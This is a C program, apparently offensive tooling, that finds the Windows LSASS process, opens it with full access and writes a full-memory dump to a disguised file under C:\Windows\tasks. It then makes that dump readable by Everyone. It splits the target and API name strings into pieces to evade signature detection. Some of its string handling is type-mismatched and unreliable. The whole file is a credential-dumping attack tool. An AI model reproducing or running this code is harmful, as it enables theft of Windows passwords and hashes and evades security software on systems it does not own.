/*

    Author: vari.sh

    Description: This program implements LSASS dump

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <aclapi.h> 

// Define the function pointer type for MiniDumpWriteDump
typedef BOOL(WINAPI* PFN_MiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

// Loads a clean copy of dbghelp.dll from the system directory
HMODULE LoadCleanDbghelp()
{
    char dllPath[] = "C:\\Windows\\System32\\dbghelp.dll";

    HMODULE hDbghelp = LoadLibraryA(dllPath);
    if (hDbghelp)
    {
        printf("Loaded clean copy of dbghelp.dll at: %p\n", hDbghelp);
    }
    else
    {
        printf("Failed to load dbghelp.dll. Error: %lu\n", GetLastError());
    }

    return hDbghelp;
}

int main(void)
{
    // Build the target process name: "lsass.exe"
    wchar_t part1[] = L"ls";
    wchar_t part2[] = L"ass";
    wchar_t part3[] = L".ex";
    wchar_t part4[] = L"e";
    char targetProcessName[50] = { 0 };
    swprintf(targetProcessName, "%s%s%s%s", part1, part2, part3, part4);

    DWORD targetPID = 0;

    // Create a snapshot of active processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("Unable to create process snapshot.\n");
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, targetProcessName) == 0)
            {
                targetPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (targetPID == 0)
    {
        printf("Target process not found.\n");
        return 1;
    }

    // Open the target process with full access (requires elevation)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess)
    {
        printf("Unable to open target process (PID: %lu).\n", targetPID);
        return 1;
    }

    // Define the dump file path
    const char* dumpFilePath = "C:\\Windows\\tasks\\ssasl.dmp";

    // Create the dump file
    HANDLE hFile = CreateFileA(dumpFilePath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Unable to create dump file.\n");
        CloseHandle(hProcess);
        return 1;
    }

    HMODULE hDbghelp = LoadCleanDbghelp();
    if (!hDbghelp)
    {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Build the function name: "MiniDumpWriteDump"
    char mdPart1[] = "Mini";
    char mdPart2[] = "Dump";
    char mdPart3[] = "Write";
    char mdPart4[] = "Dump";
    char miniFuncName[100] = { 0 };
    sprintf(miniFuncName, "%s%s%s%s", mdPart1, mdPart2, mdPart3, mdPart4);

    PFN_MiniDumpWriteDump pMiniDumpWriteDump = (PFN_MiniDumpWriteDump)GetProcAddress(hDbghelp, miniFuncName);
    if (!pMiniDumpWriteDump)
    {
        printf("Unable to retrieve MiniDumpWriteDump address.\n");
        FreeLibrary(hDbghelp);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Dump the target process
    BOOL dumped = pMiniDumpWriteDump(
        hProcess,               // Handle to target process
        targetPID,              // Process ID
        hFile,                  // Handle to dump file
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception parameter
        NULL,                   // User stream parameter
        NULL                    // Callback parameter
    );

    if (dumped)
    {
        printf("Dump completed.\n");
    }
    else
    {
        printf("Dump failed. Error code: %lu\n", GetLastError());
    }

    // Clean up resources before modifying file permissions
    FreeLibrary(hDbghelp);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    // Set file permissions to grant GENERIC_READ to Everyone
    DWORD dwRes;
    EXPLICIT_ACCESS ea;
    PACL pNewDACL = NULL;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("Failed to set entries in ACL. Error: %lu\n", dwRes);
    }
    else
    {
        dwRes = SetNamedSecurityInfoA(
            (LPSTR)dumpFilePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            pNewDACL,
            NULL);
        if (dwRes != ERROR_SUCCESS)
        {
            printf("Failed to set security info. Error: %lu\n", dwRes);
        }
    }
    if (pNewDACL)
        LocalFree(pNewDACL);

    return 0;
}
